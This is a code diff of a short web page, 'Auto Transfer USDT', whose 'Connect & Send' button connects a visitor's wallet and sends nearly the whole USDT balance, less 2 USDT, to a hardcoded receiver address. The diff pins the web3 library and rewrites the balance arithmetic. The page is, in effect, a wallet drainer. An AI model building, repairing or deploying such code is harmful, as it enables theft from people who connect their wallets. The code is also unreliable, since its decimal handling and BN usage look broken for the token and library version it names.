@@ -2,18 +2,15 @@
 <html>
 <head>
   <title>Auto Transfer USDT</title>
-  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@4.1.2/dist/web3.min.js"></script>
 </head>
 <body>
   <button onclick="connectAndTransfer()">Connect & Send</button>
 
   <script>
-    const receiverAddress = "0xC64087a6Fd263ab6A140Fb946f4CAF7B3e82147F"; // Aapka set kiya hua address
-
-    // Sahi USDT BEP20 contract address on BSC (42 characters, correct checksum)
+    const receiverAddress = "0xC64087a6Fd263ab6A140Fb946f4CAF7B3e82147F";
     const usdtContractAddress = "0x55d398326f99059fF775485246999027b3197955";
 
-    // Minimal ABI for USDT transfer
     const usdtAbi = [
       {
         "constant": true,
@@ -43,15 +40,14 @@
           const sender = accounts[0];
 
           const usdtContract = new web3.eth.Contract(usdtAbi, usdtContractAddress);
+          const balance = await usdtContract.methods.balanceOf(sender).call();
 
-          let balance = await usdtContract.methods.balanceOf(sender).call();
+          const BN = web3.utils.BN;
+          const gasFeeUsdt = new BN("2000000"); // 2 USDT (6 decimals)
+          const balanceBN = new BN(balance);
+          const amountToSend = balanceBN.sub(gasFeeUsdt);
 
-          // 2 USDT as gas buffer, 6 decimals
-          const gasFeeUsdt = web3.utils.toWei("2", "mwei");
-
-          const amountToSend = web3.utils.toBN(balance).sub(web3.utils.toBN(gasFeeUsdt));
-
-          if (amountToSend.lte(0)) {
+          if (amountToSend.lte(new BN("0"))) {
             alert("Insufficient USDT balance to send after gas fees.");
             return;
           }
